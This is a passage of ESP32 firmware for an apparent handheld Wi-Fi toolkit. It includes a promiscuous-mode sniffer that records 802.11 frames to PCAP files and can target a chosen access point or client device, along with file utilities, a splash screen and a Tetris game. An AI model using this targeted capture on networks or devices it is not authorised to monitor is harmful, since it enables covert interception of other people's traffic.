  drawBtn(HOME_X,    BTN_Y, BTN_W, "HOME",   C_CYAN);
  drawBtn(PREV_X,    BTN_Y, BTN_W, "PREV",   pcapTotalNetworks ? C_GREEN : C_GREEN_DARK);
  drawBtn(NEXT_X,    BTN_Y, BTN_W, "NEXT",   pcapTotalNetworks ? C_GREEN : C_GREEN_DARK);
  drawBtn(SEL_X,     BTN_Y, BTN_W, "SELECT", pcapTotalNetworks ? C_GREEN : C_GREEN_DARK);
  drawBtn(DEAUTH_X,  BTN_Y, BTN_W, "SNIFF",  pcapSelectedNetworkIndex >= 0 ? C_GREEN : C_GREEN_DARK);
  drawBtn(STOP_X,    BTN_Y, BTN_W, "BACK",   C_ORANGE);
  drawBtn(CONN_X,    BTN_Y, BTN_W, "SCAN",   C_GREEN);
  drawBtn(CLIENT_X,  BTN_Y, BTN_W, "",       C_GREEN_DARK);
  drawBtn(SCAN_X,    BTN_Y, BTN_W, "",       C_GREEN_DARK);
}

void drawPCAPClientButtons() {
  tft.fillRect(0, BTN_Y-2, SCREEN_W, SCREEN_H-BTN_Y+2, C_BG);
  tft.drawFastHLine(0, BTN_Y-2, SCREEN_W, C_GREEN);
  
  drawBtn(HOME_X,    BTN_Y, BTN_W, "HOME",   C_CYAN);
  drawBtn(PREV_X,    BTN_Y, BTN_W, "PREV",   pcapTotalClients ? C_GREEN : C_GREEN_DARK);
  drawBtn(NEXT_X,    BTN_Y, BTN_W, "NEXT",   pcapTotalClients ? C_GREEN : C_GREEN_DARK);
  drawBtn(SEL_X,     BTN_Y, BTN_W, "SELECT", pcapTotalClients ? C_GREEN : C_GREEN_DARK);
  drawBtn(DEAUTH_X,  BTN_Y, BTN_W, "TARGET", pcapSelectedClientIndex >= 0 ? C_RED : C_GREEN);
  drawBtn(STOP_X,    BTN_Y, BTN_W, "STOP",   C_ORANGE);
  drawBtn(CONN_X,    BTN_Y, BTN_W, "SCAN",   C_GREEN);
  drawBtn(CLIENT_X,  BTN_Y, BTN_W, "CLEAR",  C_GREEN_DARK);
  drawBtn(SCAN_X,    BTN_Y, BTN_W, "",       C_GREEN_DARK);
}

void drawPacketViewButtons() {
  tft.fillRect(0, BTN_Y-2, SCREEN_W, SCREEN_H-BTN_Y+2, C_BG);
  tft.drawFastHLine(0, BTN_Y-2, SCREEN_W, C_GREEN);
  
  drawBtn(HOME_X,    BTN_Y, BTN_W, "HOME",   C_CYAN);
  drawBtn(PREV_X,    BTN_Y, BTN_W, "PREV",   C_GREEN);
  drawBtn(NEXT_X,    BTN_Y, BTN_W, "NEXT",   C_GREEN);
  drawBtn(SEL_X,     BTN_Y, BTN_W, "TOP",    C_GREEN);
  drawBtn(DEAUTH_X,  BTN_Y, BTN_W, "BOTTOM", C_GREEN);
  drawBtn(STOP_X,    BTN_Y, BTN_W, "BACK",   C_ORANGE);
  drawBtn(CONN_X,    BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(CLIENT_X,  BTN_Y, BTN_W, "", C_GREEN_DARK);
  drawBtn(SCAN_X,    BTN_Y, BTN_W, "", C_GREEN_DARK);
}

// ============================================================
//  PCAP PACKET VIEWING FUNCTIONS
// ============================================================

String getFrameTypeString(uint8_t frameControl) {
  uint8_t type = (frameControl & 0x0C) >> 2;
  uint8_t subtype = (frameControl & 0xF0) >> 4;
  
  if(type == 0) {
    switch(subtype) {
      case 0: return "Assoc Req";
      case 1: return "Assoc Resp";
      case 2: return "Reassoc Req";
      case 3: return "Reassoc Resp";
      case 4: return "Probe Req";
      case 5: return "Probe Resp";
      case 8: return "Beacon";
      case 9: return "ATIM";
      case 10: return "Disassoc";
      case 11: return "Auth";
      case 12: return "Deauth";
      default: return "Mgmt";
    }
  } else if(type == 1) {
    switch(subtype) {
      case 10: return "PS-Poll";
      case 11: return "RTS";
      case 12: return "CTS";
      case 13: return "ACK";
      case 14: return "CF-End";
      case 15: return "CF-End+ACK";
      default: return "Ctrl";
    }
  } else if(type == 2) {
    switch(subtype) {
      case 0: return "Data";
      case 1: return "Data+CF-ACK";
      case 2: return "Data+CF-Poll";
      case 3: return "Data+CF-ACK+CF-Poll";
      case 4: return "Null";
      case 5: return "CF-ACK";
      case 6: return "CF-Poll";
      case 7: return "CF-ACK+CF-Poll";
      default: return "Data";
    }
  }
  return "Unknown";
}

void addPacketToList(wifi_promiscuous_pkt_t* pkt) {
  for(int i = 49; i > 0; i--) {
    memcpy(&pcap.packetList[i], &pcap.packetList[i-1], sizeof(PacketInfo));
  }
  
  PacketInfo* info = &pcap.packetList[0];
  
  const uint8_t* payload = pkt->payload;
  const uint8_t* addr1 = payload + 4;
  const uint8_t* addr2 = payload + 10;
  const uint8_t* addr3 = payload + 16;
  
  info->timestamp = millis() / 1000;
  info->length = pkt->rx_ctrl.sig_len;
  info->rssi = pkt->rx_ctrl.rssi;
  info->frameType = payload[0];
  info->frameSubtype = (payload[0] & 0xF0) >> 4;
  info->frameTypeStr = getFrameTypeString(payload[0]);
  
  memcpy(info->destMAC, addr1, 6);
  memcpy(info->srcMAC, addr2, 6);
  memcpy(info->bssid, addr3, 6);
  
  char macStr[18];
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", addr1[0], addr1[1], addr1[2], addr1[3], addr1[4], addr1[5]);
  info->destMACStr = String(macStr);
  
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", addr2[0], addr2[1], addr2[2], addr2[3], addr2[4], addr2[5]);
  info->srcMACStr = String(macStr);
  
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", addr3[0], addr3[1], addr3[2], addr3[3], addr3[4], addr3[5]);
  info->bssidStr = String(macStr);
  
  if(pcap.packetListIndex < 50) pcap.packetListIndex++;
}

void displayPacketView() {
  tft.fillRect(LIST_X, LIST_Y, LIST_W + RADAR_PANEL_W, LIST_H, C_BG);
  
  int y = LIST_Y + 10;
  
  tft.setTextColor(C_CYAN, C_BG);
  tft.setTextSize(2);
  tft.setCursor(160, y);
  tft.print("PACKET VIEW");
  y += 25;
  
  tft.setTextColor(C_GREEN_DIM, C_BG);
  tft.setTextSize(1);
  tft.setCursor(10, y);
  tft.printf("Last %d packets", pcap.packetListIndex);
  y += 15;
  
  tft.drawFastHLine(10, y, 460, C_GREEN_DARK);
  y += 10;
  
  if(pcap.packetListIndex == 0) {
    tft.setTextColor(C_GREEN_DARK, C_BG);
    tft.setCursor(150, 140);
    tft.print("No packets yet");
    tft.setCursor(130, 160);
    tft.print("Start capture first");
  } else {
    int startIdx = pcap.viewedPacketIndex;
    int maxRows = 8;
    
    for(int row = 0; row < maxRows && (startIdx + row) < pcap.packetListIndex; row++) {
      int idx = startIdx + row;
      PacketInfo* pkt = &pcap.packetList[idx];
      
      if(row == 0) {
        tft.fillRect(0, y-2, SCREEN_W, 20, C_GREEN_DARK);
      }
      
      tft.setTextColor(row == 0 ? C_YELLOW : C_GREEN, row == 0 ? C_GREEN_DARK : C_BG);
      tft.setCursor(5, y);
      tft.printf("#%d", idx+1);
      
      tft.setCursor(40, y);
      tft.print(pkt->frameTypeStr);
      
      tft.setCursor(120, y);
      tft.printf("%d bytes", pkt->length);
      
      tft.setTextColor(sigColor(pkt->rssi), row == 0 ? C_GREEN_DARK : C_BG);
      tft.setCursor(190, y);
      tft.printf("%d dBm", pkt->rssi);
      
      y += 12;
      
      tft.setTextColor(C_GREEN_DIM, row == 0 ? C_GREEN_DARK : C_BG);
      tft.setCursor(20, y);
      tft.print("SRC: " + pkt->srcMACStr.substring(0, 17));
      y += 12;
      
      tft.setCursor(20, y);
      tft.print("DST: " + pkt->destMACStr.substring(0, 17));
      y += 12;
      
      tft.drawFastHLine(10, y-2, 460, C_GREEN_DARK);
      y += 5;
      
      if(y > LIST_H + LIST_Y - 30) break;
    }
    
    tft.setTextColor(C_GREEN_DIM, C_BG);
    tft.setCursor(10, LIST_Y + LIST_H - 20);
    tft.printf("Page %d/%d", (pcap.viewedPacketIndex/8)+1, ((pcap.packetListIndex-1)/8)+1);
  }
}

void enterPacketView() {
  pcap.viewingPackets = true;
  pcap.viewedPacketIndex = 0;
  currentMode = MODE_PCAP_PACKET_VIEW;
  tft.fillScreen(C_BG);
  displayPacketView();
  drawPacketViewButtons();
}

void exitPacketView() {
  pcap.viewingPackets = false;
  currentMode = MODE_PCAP_CAPTURE;
  tft.fillScreen(C_BG);
  displayPCAPView();
  drawPCAPButtons();
}

// ============================================================
//  SD CARD AND PCAP FUNCTIONS
// ============================================================

bool initSDCard() {
  SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
  
  pinMode(SD_CS, OUTPUT);
  digitalWrite(SD_CS, HIGH);
  
  delay(100);
  
  if (!SD.begin(SD_CS)) {
    Serial.println("[-] SD Card initialization failed!");
    return false;
  }
  
  uint8_t cardType = SD.cardType();
  if(cardType == CARD_NONE) {
    Serial.println("[-] No SD card attached");
    return false;
  }
  
  Serial.print("[+] SD Card Type: ");
  if(cardType == CARD_MMC) Serial.println("MMC");
  else if(cardType == CARD_SD) Serial.println("SDSC");
  else if(cardType == CARD_SDHC) Serial.println("SDHC");
  else Serial.println("UNKNOWN");
  
  uint64_t cardSize = SD.cardSize() / (1024 * 1024);
  Serial.printf("[+] SD Card Size: %llu MB\n", cardSize);
  
  if(!SD.exists("/pcap")) {
    SD.mkdir("/pcap");
    Serial.println("[+] Created /pcap directory");
  }
  
  return true;
}

String generatePCAPFilename() {
  char filename[64];
  struct tm timeinfo;
  
  if(!getLocalTime(&timeinfo)) {
    sprintf(filename, "/pcap/capture_%lu.pcap", millis());
  } else {
    strftime(filename, sizeof(filename), "/pcap/%Y%m%d_%H%M%S.pcap", &timeinfo);
  }
  
  return String(filename);
}

void selectPCAPClient() {
  if (pcapTotalClients == 0) {
    showMessage("No clients found!", 1500);
    return;
  }
  
  if (pcapSelectedClientIndex >= 0) {
    memcpy(pcap.targetDeviceMAC, pcapClients[pcapSelectedClientIndex].mac, 6);
    pcap.targetDeviceMACStr = pcapClients[pcapSelectedClientIndex].macStr;
    pcap.filterByDevice = true;
    pcap.deviceIsClient = true;
    
    if (pcapSelectedNetworkIndex >= 0) {
      memcpy(pcap.targetBSSID, pcapNetworks[pcapSelectedNetworkIndex].bssid, 6);
      pcap.targetSSID = pcapNetworks[pcapSelectedNetworkIndex].ssid;
      pcap.targetChannel = pcapNetworks[pcapSelectedNetworkIndex].channel;
      pcap.filterByNetwork = true;
    }
    
    String msg = "Targeting: " + pcap.targetDeviceMACStr.substring(0, 17);
    showMessage(msg, 2000);
    Serial.printf("[PCAP] Targeting device: %s\n", pcap.targetDeviceMACStr.c_str());
  } else {
    showMessage("Select a client first!", 1500);
  }
}

void selectPCAPAP() {
  if (pcapSelectedNetworkIndex < 0) {
    showMessage("Select an AP first!", 1500);
    return;
  }
  
  memcpy(pcap.targetBSSID, pcapNetworks[pcapSelectedNetworkIndex].bssid, 6);
  pcap.targetSSID = pcapNetworks[pcapSelectedNetworkIndex].ssid;
  pcap.targetChannel = pcapNetworks[pcapSelectedNetworkIndex].channel;
  pcap.filterByNetwork = true;
  pcap.filterByDevice = false;
  
  String msg = "Targeting AP: " + pcap.targetSSID.substring(0, 15);
  showMessage(msg, 2000);
  Serial.printf("[PCAP] Targeting AP: %s (CH:%d)\n", 
    pcap.targetSSID.c_str(), pcap.targetChannel);
}

void clearPCAPFilters() {
  pcap.filterByNetwork = false;
  pcap.filterByDevice = false;
  memset(pcap.targetBSSID, 0, 6);
  memset(pcap.targetDeviceMAC, 0, 6);
  pcap.targetSSID = "";
  pcap.targetDeviceMACStr = "";
  pcap.targetChannel = 0;
  showMessage("Filters cleared - capturing all", 1500);
  Serial.println("[PCAP] Filters cleared - capturing all packets");
}

bool startPCAPCapture(uint32_t duration, uint32_t maxPackets) {
  if(pcap.isCapturing) {
    stopPCAPCapture();
  }
  
  if(!SD.begin(SD_CS)) {
    if(!initSDCard()) {
      showMessage("SD Card Error!", 2000);
      return false;
    }
  }
  
  pcap.filename = generatePCAPFilename();
  
  pcap.currentFile = SD.open(pcap.filename, FILE_WRITE);
  if(!pcap.currentFile) {
    Serial.println("[-] Failed to create PCAP file: " + pcap.filename);
    showMessage("Failed to create file", 2000);
    return false;
  }
  
  pcap_hdr_t pcap_header = {
    0xa1b2c3d4, 2, 4, 0, 0, 65535, 105
  };
  
  pcap.currentFile.write((uint8_t*)&pcap_header, sizeof(pcap_hdr_t));
  pcap.currentFile.flush();
  
  pcap.isCapturing = true;
  pcap.packetCount = 0;
  pcap.startTime = millis();
  pcap.fileSize = sizeof(pcap_hdr_t);
  pcap.maxPackets = maxPackets;
  pcap.captureDuration = duration;
  pcap.packetListIndex = 0;
  
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&pcapSnifferCallback);
  
  wifi_promiscuous_filter_t filter;
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
  esp_wifi_set_promiscuous_filter(&filter);
  
  if(pcap.filterByNetwork && pcap.targetChannel > 0) {
    esp_wifi_set_channel(pcap.targetChannel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[PCAP] Targeting network: %s on channel %d\n", 
      pcap.targetSSID.c_str(), pcap.targetChannel);
  }
  
  if(pcap.filterByDevice) {
    Serial.printf("[PCAP] Targeting device: %s\n", pcap.targetDeviceMACStr.c_str());
  }
  
  Serial.printf("[PCAP] Capture started: %s\n", pcap.filename.c_str());
  Serial.printf("    Max packets: %lu, Duration: %lu sec\n", maxPackets, duration);
  
  showMessage("PCAP Recording...", 500);
  return true;
}

void stopPCAPCapture() {
  if(pcap.currentFile) {
    pcap.currentFile.close();
    
    Serial.printf("[PCAP] Capture stopped\n");
    Serial.printf("    File: %s\n", pcap.filename.c_str());
    Serial.printf("    Packets: %lu\n", pcap.packetCount);
    Serial.printf("    Size: %lu bytes\n", pcap.fileSize);
    
    char msg[64];
    sprintf(msg, "Saved: %lu packets", pcap.packetCount);
    showMessage(msg, 2000);
  }
  
  esp_wifi_set_promiscuous(false);
  
  pcap.isCapturing = false;
}

void IRAM_ATTR pcapSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if(!pcap.isCapturing) return;
  
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  if(pkt->rx_ctrl.sig_len < 24) return;
  
  const uint8_t* payload = pkt->payload;
  const uint8_t* addr1 = payload + 4;
  const uint8_t* addr2 = payload + 10;
  const uint8_t* addr3 = payload + 16;
  
  bool shouldCapture = true;
  
  if(pcap.filterByNetwork) {
    bool networkMatch = (memcmp(addr3, pcap.targetBSSID, 6) == 0) ||
                        (memcmp(addr2, pcap.targetBSSID, 6) == 0);
    if(!networkMatch) shouldCapture = false;
  }
  
  if(pcap.filterByDevice && shouldCapture) {
    bool deviceMatch = (memcmp(addr1, pcap.targetDeviceMAC, 6) == 0) ||
                       (memcmp(addr2, pcap.targetDeviceMAC, 6) == 0);
    if(!deviceMatch) shouldCapture = false;
  }
  
  if(!shouldCapture) return;
  
  if(pcap.packetCount >= pcap.maxPackets) {
    pcap.isCapturing = false;
    return;
  }
  
  if(pcap.fileSize + pkt->rx_ctrl.sig_len + sizeof(pcaprec_hdr_t) > pcap.maxFileSize) {
    pcap.isCapturing = false;
    return;
  }
  
  uint32_t timestamp = millis() / 1000;
  
  pcaprec_hdr_t pkt_header;
  pkt_header.ts_sec = timestamp;
  pkt_header.ts_usec = (millis() % 1000) * 1000;
  pkt_header.incl_len = pkt->rx_ctrl.sig_len;
  pkt_header.orig_len = pkt->rx_ctrl.sig_len;
  
  pcap.currentFile.write((uint8_t*)&pkt_header, sizeof(pcaprec_hdr_t));
  pcap.currentFile.write(pkt->payload, pkt->rx_ctrl.sig_len);
  
  addPacketToList(pkt);
  
  pcap.packetCount++;
  pcap.fileSize += sizeof(pcaprec_hdr_t) + pkt->rx_ctrl.sig_len;
}

void listPCAPFiles() {
  File root = SD.open("/pcap");
  if(!root) {
    Serial.println("[-] Failed to open /pcap directory");
    return;
  }
  
  Serial.println("\n=== PCAP Files on SD Card ===");
  
  File file = root.openNextFile();
  int count = 0;
  
  while(file) {
    if(!file.isDirectory()) {
      String name = file.name();
      if(name.endsWith(".pcap")) {
        count++;
        Serial.printf("  %d. %-30s %8lu bytes\n", 
          count, name.c_str(), file.size());
      }
    }
    file = root.openNextFile();
  }
  
  if(count == 0) {
    Serial.println("  No PCAP files found");
  }
  
  root.close();
}

bool deletePCAPFile(String filename) {
  String fullpath = "/pcap/" + filename;
  if(!SD.exists(fullpath)) {
    Serial.println("[-] File not found: " + fullpath);
    return false;
  }
  
  if(SD.remove(fullpath)) {
    Serial.println("[+] Deleted: " + fullpath);
    return true;
  } else {
    Serial.println("[-] Failed to delete: " + fullpath);
    return false;
  }
}

void viewPCAPStats(String filename) {
  String fullpath = "/pcap/" + filename;
  File file = SD.open(fullpath, FILE_READ);
  if(!file) {
    Serial.println("[-] Failed to open file");
    return;
  }
  
  pcap_hdr_t header;
  if(file.read((uint8_t*)&header, sizeof(pcap_hdr_t)) != sizeof(pcap_hdr_t)) {
    Serial.println("[-] Invalid PCAP file");
    file.close();
    return;
  }
  
  Serial.println("\n=== PCAP File Statistics ===");
  Serial.println("File: " + filename);
  Serial.printf("Size: %lu bytes\n", file.size());
  Serial.printf("Magic: 0x%08X\n", header.magic_number);
  Serial.printf("Version: %d.%d\n", header.version_major, header.version_minor);
  Serial.printf("Snaplen: %lu\n", header.snaplen);
  Serial.printf("Network: %lu (", header.network);
  
  switch(header.network) {
    case 1: Serial.print("Ethernet"); break;
    case 105: Serial.print("802.11"); break;
    case 127: Serial.print("802.11 with radiotap"); break;
    default: Serial.print("Unknown");
  }
  Serial.println(")");
  
  uint32_t packetCount = 0;
  uint32_t totalData = 0;
  uint32_t firstTimestamp = 0;
  uint32_t lastTimestamp = 0;
  
  while(file.available() >= sizeof(pcaprec_hdr_t)) {
    pcaprec_hdr_t pkt_header;
    if(file.read((uint8_t*)&pkt_header, sizeof(pcaprec_hdr_t)) != sizeof(pcaprec_hdr_t)) break;
    
    if(packetCount == 0) firstTimestamp = pkt_header.ts_sec;
    lastTimestamp = pkt_header.ts_sec;
    
    totalData += pkt_header.incl_len;
    
    file.seek(file.position() + pkt_header.incl_len);
    
    packetCount++;
  }
  
  Serial.printf("Packets: %lu\n", packetCount);
  Serial.printf("Total data: %lu bytes\n", totalData);
  Serial.printf("Duration: %lu seconds\n", lastTimestamp - firstTimestamp);
  Serial.printf("Avg packet size: %lu bytes\n", 
    packetCount > 0 ? totalData / packetCount : 0);
  
  file.close();
}

// ============================================================
//  SHOW COOL LOADING SCREEN
// ============================================================
void showCoolLoadingScreen() {
  tft.fillScreen(C_BG);
  
  int centerX = 240;
  int centerY = 140;
  
  tft.setTextColor(C_WHITE, C_BG);
  tft.setTextSize(4);
  tft.setCursor(120, 20);
  tft.print("NEO");
  
  tft.setTextColor(C_WHITE, C_BG);
  tft.setTextSize(4);
  tft.setCursor(240, 20);
  tft.print("OWL");
  
  tft.drawLine(120, 55, 340, 55, C_WHITE);
  tft.drawLine(120, 56, 340, 56, C_GREY);
  tft.fillCircle(120, 55, 2, C_WHITE);
  tft.fillCircle(340, 55, 2, C_WHITE);
  tft.fillCircle(230, 55, 2, C_WHITE);
  
  int leftEyeX = centerX - 70;
  int leftEyeY = centerY - 30;
  
  for(int i = 0; i < 6; i++) {
    float angle1 = i * 60 * DEG_TO_RAD;
    float angle2 = (i+1) * 60 * DEG_TO_RAD;
    
    int x1 = leftEyeX + 25 * cos(angle1);
    int y1 = leftEyeY + 25 * sin(angle1);
    int x2 = leftEyeX + 25 * cos(angle2);
    int y2 = leftEyeY + 25 * sin(angle2);
    
    tft.drawLine(x1, y1, x2, y2, C_WHITE);
  }
  
  tft.fillCircle(leftEyeX, leftEyeY, 8, C_WHITE);
  tft.fillCircle(leftEyeX, leftEyeY, 4, C_BLACK);
  
  int rightEyeX = centerX + 70;
  int rightEyeY = centerY - 30;
  
  for(int i = 0; i < 6; i++) {
    float angle1 = i * 60 * DEG_TO_RAD;
    float angle2 = (i+1) * 60 * DEG_TO_RAD;
    
    int x1 = rightEyeX + 25 * cos(angle1);
    int y1 = rightEyeY + 25 * sin(angle1);
    int x2 = rightEyeX + 25 * cos(angle2);
    int y2 = rightEyeY + 25 * sin(angle2);
    
    tft.drawLine(x1, y1, x2, y2, C_WHITE);
  }
  
  tft.fillCircle(rightEyeX, rightEyeY, 8, C_WHITE);
  tft.fillCircle(rightEyeX, rightEyeY, 4, C_BLACK);
  
  tft.drawRect(80, 280, 320, 20, C_WHITE);
  
  for(int i = 0; i < 3; i++) {
    tft.drawRect(81 + i, 281 + i, 318 - i*2, 18 - i*2, C_GREY);
  }
  
  for (int i = 0; i <= 100; i += 2) {
    int barWidth = map(i, 0, 100, 0, 316);
    tft.fillRect(82, 282, barWidth, 16, C_WHITE);
    
    tft.fillRect(200, 250, 60, 20, C_BG);
    tft.setTextColor(C_WHITE, C_BG);
    tft.setTextSize(2);
    tft.setCursor(210, 250);
    
    if(i < 10) tft.print("0");
    tft.print(i);
    tft.print("%");
    
    delay(20);
  }
  
  delay(200);
  
  tft.fillRect(80, 280, 320, 30, C_BG);
  
  tft.setTextColor(C_WHITE, C_BG);
  tft.setTextSize(2);
  tft.setCursor(130, 285);
  tft.print("> SYSTEM READY <");
  
  tft.setCursor(310, 285);
  tft.print("_");
  delay(200);
  tft.setCursor(310, 285);
  tft.print(" ");
  delay(200);
}

// ============================================================
//  TETRIS FUNCTIONS
// ============================================================
void initTetris() {
  for(int y = 0; y < TETRIS_BOARD_H; y++) {
    for(int x = 0; x < TETRIS_BOARD_W; x++) {
      tetrisBoard[y][x] = 0;
    }
  }
  
  tetrisScore = 0;
  tetrisLevel = 0;
  tetrisLines = 0;
  tetrisFallDelay = 500;
  tetrisGameActive = true;
  tetrisGameOver = false;
  
  randomSeed(millis());
  tetrisNextPiece = random(7);
  spawnNewPiece();
  
  tetrisLastFall = millis();
}

void spawnNewPiece() {
  tetrisCurrentPiece = tetrisNextPiece;
  tetrisNextPiece = random(7);
  tetrisCurrentX = 3;
  tetrisCurrentY = 0;
  tetrisRotation = 0;
  
  if(checkCollision(tetrisCurrentPiece, tetrisRotation, tetrisCurrentX, tetrisCurrentY)) {
    tetrisGameActive = false;
    tetrisGameOver = true;
  }
}

bool checkCollision(int piece, int rot, int x, int y) {
  for(int py = 0; py < 4; py++) {
    for(int px = 0; px < 4; px++) {
      if(tetrominos[piece][rot] & (1 << (15 - (py*4 + px)))) {
        int boardX = x + px;
        int boardY = y + py;
        
        if(boardX < 0 || boardX >= TETRIS_BOARD_W || 
           boardY >= TETRIS_BOARD_H || 
           (boardY >= 0 && tetrisBoard[boardY][boardX] != 0)) {
          return true;
        }
      }
    }
  }
  return false;
}

void mergePiece() {
  for(int py = 0; py < 4; py++) {
    for(int px = 0; px < 4; px++) {
      if(tetrominos[tetrisCurrentPiece][tetrisRotation] & (1 << (15 - (py*4 + px)))) {
        int boardX = tetrisCurrentX + px;
        int boardY = tetrisCurrentY + py;
        if(boardY >= 0 && boardY < TETRIS_BOARD_H && boardX >= 0 && boardX < TETRIS_BOARD_W) {
          tetrisBoard[boardY][boardX] = tetrisCurrentPiece + 1;
        }
      }
    }
  }
  
  clearLines();
  spawnNewPiece();
}

void clearLines() {
  int linesCleared = 0;
  
  for(int y = TETRIS_BOARD_H - 1; y >= 0; y--) {
    bool lineFull = true;
    for(int x = 0; x < TETRIS_BOARD_W; x++) {
      if(tetrisBoard[y][x] == 0) {
        lineFull = false;
        break;
      }
    }
    
    if(lineFull) {
      for(int yy = y; yy > 0; yy--) {
        for(int x = 0; x < TETRIS_BOARD_W; x++) {
          tetrisBoard[yy][x] = tetrisBoard[yy-1][x];
        }
      }
      for(int x = 0; x < TETRIS_BOARD_W; x++) {
        tetrisBoard[0][x] = 0;
      }
      linesCleared++;
      y++;
    }
  }
  
  if(linesCleared > 0) {
    tetrisLines += linesCleared;
    tetrisScore += linesCleared * 100 * (linesCleared + tetrisLevel);
    
    int newLevel = tetrisLines / 10;
    if(newLevel > tetrisLevel) {
      tetrisLevel = newLevel;
      tetrisFallDelay = max(100, 500 - tetrisLevel * 40);
    }
  }
}

void rotatePiece() {
  int newRot = (tetrisRotation + 1) % 4;
  if(!checkCollision(tetrisCurrentPiece, newRot, tetrisCurrentX, tetrisCurrentY)) {
    tetrisRotation = newRot;
  }
}

void movePiece(int dx, int dy) {
  if(!checkCollision(tetrisCurrentPiece, tetrisRotation, tetrisCurrentX + dx, tetrisCurrentY + dy)) {
    tetrisCurrentX += dx;
    tetrisCurrentY += dy;
  } else if(dy == 1) {
    mergePiece();
    tetrisLastFall = millis();
  }
}

void hardDrop() {
  while(!checkCollision(tetrisCurrentPiece, tetrisRotation, tetrisCurrentX, tetrisCurrentY + 1)) {
    tetrisCurrentY++;
  }
  mergePiece();
  tetrisLastFall = millis();
}

void gameOver() {
  tft.fillRect(250, 130, 150, 50, C_BG);
  tft.setTextColor(C_RED, C_BG);
  tft.setTextSize(2);
  tft.setCursor(280, 140);
  tft.print("GAME OVER");
  tft.setTextSize(1);
  tft.setCursor(260, 170);
  tft.print("Press STOP for menu");
}

void drawTetris() {
  tft.fillRect(LIST_X, LIST_Y, LIST_W + RADAR_PANEL_W, LIST_H, C_BG);
  
  int boardWidth = TETRIS_BLOCK_SIZE * TETRIS_BOARD_W;
  int boardHeight = TETRIS_BLOCK_SIZE * TETRIS_BOARD_H;
  int centerX = (SCREEN_W - boardWidth) / 2;
  int centerY = (LIST_Y + (LIST_H - boardHeight) / 2) - 10;
  
  tft.drawRect(centerX - 2, centerY - 2, 
               boardWidth + 4, boardHeight + 4, C_GREEN);
  
  for(int y = 0; y < TETRIS_BOARD_H; y++) {
    for(int x = 0; x < TETRIS_BOARD_W; x++) {
      int blockX = centerX + x * TETRIS_BLOCK_SIZE;
      int blockY = centerY + y * TETRIS_BLOCK_SIZE;
      
      if(tetrisBoard[y][x] != 0) {
        uint16_t colors[] = {C_CYAN, C_YELLOW, C_PURPLE, C_GREEN, C_RED, C_BLUE, C_ORANGE};
        tft.fillRect(blockX, blockY, TETRIS_BLOCK_SIZE-1, TETRIS_BLOCK_SIZE-1, 
                    colors[tetrisBoard[y][x]-1]);
        tft.drawRect(blockX, blockY, TETRIS_BLOCK_SIZE-1, TETRIS_BLOCK_SIZE-1, C_WHITE);
      } else {
        tft.fillRect(blockX, blockY, TETRIS_BLOCK_SIZE-1, TETRIS_BLOCK_SIZE-1, C_BLACK);
        tft.drawRect(blockX, blockY, TETRIS_BLOCK_SIZE-1, TETRIS_BLOCK_SIZE-1, C_GREY);
      }
    }
  }
  
  if(tetrisGameActive && !tetrisGameOver) {
    for(int py = 0; py < 4; py++) {
      for(int px = 0; px < 4; px++) {
        if(tetrominos[tetrisCurrentPiece][tetrisRotation] & (1 << (15 - (py*4 + px)))) {
          int boardX = tetrisCurrentX + px;
          int boardY = tetrisCurrentY + py;
          if(boardY >= 0 && boardY < TETRIS_BOARD_H && boardX >= 0 && boardX < TETRIS_BOARD_W) {
            int blockX = centerX + boardX * TETRIS_BLOCK_SIZE;
            int blockY = centerY + boardY * TETRIS_BLOCK_SIZE;
            uint16_t colors[] = {C_CYAN, C_YELLOW, C_PURPLE, C_GREEN, C_RED, C_BLUE, C_ORANGE};
            tft.fillRect(blockX, blockY, TETRIS_BLOCK_SIZE-1, TETRIS_BLOCK_SIZE-1, 
                        colors[tetrisCurrentPiece]);
            tft.drawRect(blockX, blockY, TETRIS_BLOCK_SIZE-1, TETRIS_BLOCK_SIZE-1, C_WHITE);
          }
        }
      }
    }
  }
  
  int previewX = centerX + boardWidth + 25;
  int previewY = centerY;
  
  tft.setTextColor(C_GREEN, C_BG);
  tft.setTextSize(1);
  tft.setCursor(previewX, previewY);
  tft.print("NEXT");
  
  previewY += 20;
  
  for(int py = 0; py < 4; py++) {
    for(int px = 0; px < 4; px++) {
      if(tetrominos[tetrisNextPiece][0] & (1 << (15 - (py*4 + px)))) {
        int blockX = previewX + px * TETRIS_BLOCK_SIZE;
        int blockY = previewY + py * TETRIS_BLOCK_SIZE;
        uint16_t colors[] = {C_CYAN, C_YELLOW, C_PURPLE, C_GREEN, C_RED, C_BLUE, C_ORANGE};
        tft.fillRect(blockX, blockY, TETRIS_BLOCK_SIZE-2, TETRIS_BLOCK_SIZE-2, 
                    colors[tetrisNextPiece]);
        tft.drawRect(blockX, blockY, TETRIS_BLOCK_SIZE-2, TETRIS_BLOCK_SIZE-2, C_WHITE);
      }
    }
  }
  
  int infoX = previewX;
  int infoY = previewY + 100;
  
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(infoX, infoY);
  tft.print("SCORE");
  tft.setTextColor(C_WHITE, C_BG);
  tft.setCursor(infoX, infoY + 15);
  tft.print(tetrisScore);
  
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(infoX, infoY + 40);
  tft.print("LINES");
  tft.setTextColor(C_WHITE, C_BG);
  tft.setCursor(infoX, infoY + 55);
  tft.print(tetrisLines);
  
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(infoX, infoY + 80);
  tft.print("LEVEL");
  tft.setTextColor(C_WHITE, C_BG);
  tft.setCursor(infoX, infoY + 95);
  tft.print(tetrisLevel);
  
  if(tetrisGameOver) {
    gameOver();
  }  
  tft.drawFastVLine(LIST_W, LIST_Y, LIST_H, C_GREEN);
}

void drawTetrisButtons() {
  tft.fillRect(0, BTN_Y-2, SCREEN_W, SCREEN_H-BTN_Y+2, C_BG);
  tft.drawFastHLine(0, BTN_Y-2, SCREEN_W, C_GREEN);
  
